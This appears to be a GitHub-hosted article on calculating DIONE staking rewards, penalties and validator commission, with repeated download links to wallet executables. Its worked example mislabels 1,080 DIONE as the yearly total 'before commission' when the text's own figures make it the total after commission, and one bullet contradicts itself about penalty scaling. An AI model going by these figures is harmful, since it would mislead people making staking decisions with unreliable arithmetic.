![DIONE Wallet](assets/banner-article.png)

# Calculate DIONE Staking Rewards Before You Delegate

<p align="center">Do the arithmetic before the click</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE staking pays a base reward of 1% per 30-day period, capped at 8% a year, minus the validator's commission. Multiply your stake by the rate, subtract the commission, and apply the cap - then compare the result with the early-exit penalty before deciding. The penalty is what turns a positive rate into a loss.

## The inputs, and where each comes from

Four numbers, none of them guesses:

| Input | Where it comes from |
| --- | --- |
| Stake amount | what you delegate, at or above 10,000 DIONE |
| Base rate | 1% per 30-day period, published in the programme |
| Annual cap | 8% maximum |
| Commission | the validator's rate, shown in the wallet's list |

Everything else is arithmetic. There is no separate calculator required, though the wallet tracks accrued rewards so you can check your arithmetic against reality.

## A worked example

Take a 10,000 DIONE delegation to a validator charging 10%, held for one 30-day period:

1. Base reward: 1% of 10,000 = 100 DIONE.
2. Commission: 10% of 100 = 10 DIONE.
3. Net for the period: 90 DIONE.

Over a year at the same rate the arithmetic would suggest 1,080 DIONE before commission, which exceeds the 8% cap - so the cap governs, and the annual ceiling is 800 DIONE before commission, 720 after.

That is the whole calculation, and the last step is the one people miss: the published annual maximum is a ceiling on the outcome, not a second rate to add.

## Why the answer is a range

The rate is fixed by the programme, and three things move the outcome:

- **Commission**, which is the validator's choice and can change.
- **Uptime**, because a validator that misses blocks earns less than its rate suggests.
- **Leaderboard bonus**, which the top hundred validators receive and which is not available to the rest.

So "how much will I earn" has an honest answer of "between these two numbers, depending on your validator". Anyone quoting a single figure is either assuming a validator or ignoring one of the three.

## The comparison that decides it

Before delegating, run the exit sum as well as the reward sum:

- **Reward** for the period you intend to stay bonded.
- **Penalty** if you leave before consolidation: 7% in the first month, 6% under three months, 5% before consolidation.

At 1% per period, a 7% penalty is worth more than a quarter of a year's reward. Delegating money you might need in three weeks is therefore a losing trade even though the rate is positive.

[DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md) sets out the schedule, and [Unstake DIONE and Wait Out the Unbonding Period](https://github.com/dione-protocol/staking-and-network/blob/main/unstake-dione-and-wait-for-unbonding.md) the 10-day wait that runs alongside it.

## Is there a calculator?

The wallet tracks rewards as they accrue, which is a running figure rather than a projection. For forward-looking sums, the arithmetic above is the tool: a spreadsheet with stake, rate, commission and periods is enough, and it takes five minutes to build once.

Be careful with third-party calculators. One that quotes a fixed percentage without asking for your validator's commission is not calculating your return; it is quoting a headline rate.

## How much do you need for a meaningful reward?

The minimum is 10,000 DIONE, and at 1% per period that is roughly 100 DIONE gross per 30 days, less commission. Whether that is meaningful is a personal judgement rather than a technical one.

What is worth knowing before deciding:

- **Fees are small but not zero.** Claiming rewards is a transaction with a network fee; claiming daily on a small stake costs a visible share of the reward.
- **Compounding needs the minimum.** Claimed rewards can only be redelegated if they clear 10,000 DIONE themselves, so a smaller stake compounds by adding new funds rather than by redelegating.
- **The exit penalty does not scale down.** It applies proportionally, so a small stake pays a small penalty - but the 10-day wait is the same either way.

## What a calculation cannot tell you

It cannot tell you what the token will be worth, and any figure that implies a return in money rather than in DIONE is making an assumption it has not disclosed. It also cannot tell you whether a validator will stay online or keep its commission.

Both belong in the decision, and neither belongs in the arithmetic. [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md) covers the programme's terms, and [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) the choice the numbers depend on.

## A short checklist

1. Stake at or above the minimum, with a fee reserve outside it.
2. Read the validator's commission and uptime.
3. Compute net reward per period, then apply the 8% annual cap.
4. Compare with the penalty if you might exit early.
5. Decide, delegate, and re-check the validator's numbers occasionally.

Five steps, no forecasting, and the answer is a range rather than a promise.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Reward tracking comes from the app, and a build that is behind can show a delegation without its accrued rewards - which reads as a calculation error when it is a display one. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before checking your figures against the screen.

## FAQ

### How much will I earn staking DIONE?

Take the published rate of 1% per 30-day period, subtract the validator's commission, and apply the 8% annual cap. The result depends on the validator you choose.

### Is there a DIONE staking calculator?

The wallet tracks accrued rewards, which is the running figure. For a projection, multiply stake by rate, subtract commission, and cap the annual total at 8%.

### How much DIONE do I need to earn a meaningful reward?

The minimum is 10,000 DIONE, which is about 100 DIONE gross per 30-day period before commission. Whether that is worth it depends on how long you can leave it bonded.

### Do the fees make small stakes pointless?

Not pointless, but claiming often on a small stake costs a visible share of the reward. Claim at intervals that make the fee irrelevant rather than weekly.

### Why is the annual cap lower than twelve periods of the rate?

Because the programme sets an annual maximum of 8%. Where the per-period rate would exceed it over a year, the cap is the figure that applies.

Staking arithmetic is simple once the penalty is included, and the penalty is the part that decides whether a delegation was worth making. The programme terms are in [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md), the validator choice in [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md), and the mechanics in [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md).
